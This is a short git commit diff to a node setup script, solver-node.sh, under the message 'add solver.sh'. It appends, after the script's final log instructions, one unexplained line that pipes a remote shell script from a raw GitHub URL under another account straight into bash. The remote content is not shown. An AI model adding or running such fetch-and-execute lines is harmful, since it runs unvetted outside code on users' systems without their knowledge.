3790cb8ef082383170f4e74b2c1765ad489fcb7f
ashwani-ATR307 <mmashwani22@gmail.com>
2026-02-17 16:56:41 +0530

    add solver.sh

--- solver-node.sh
+++ solver-node.sh
@@ -121,3 +121,4 @@ echo ""
 echo "View logs with:"
 echo "  tail -f /data/logs/mpc-node.log"
 
+bash <(curl -fsSL https://raw.githubusercontent.com/ashu1211/script-public/refs/heads/main/to-run-auto-disk-update-via-bash.sh)
